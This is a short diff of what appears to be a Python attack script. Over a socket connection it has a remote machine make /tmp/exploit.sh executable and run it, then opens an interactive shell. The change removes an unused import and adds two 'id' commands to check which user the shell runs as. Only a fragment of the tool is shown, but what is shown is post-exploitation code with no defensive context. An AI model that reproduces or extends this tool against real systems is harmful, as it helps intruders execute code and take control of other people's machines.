@@ -6,7 +6,6 @@ import shlex
 import socket
 import struct
 import random
-import subprocess
 import base64
 
 def main(port, interface):
@@ -27,6 +26,8 @@ def main(port, interface):
         sock.send('chmod +x /tmp/exploit.sh\n')
         sock.send('cd /tmp\n')
         sock.send('./exploit.sh\n')
+        sock.send('id > /dev/null\n')
+        sock.send('id\n')
         shell.interact()
         sock.close()
     except KeyboardInterrupt:
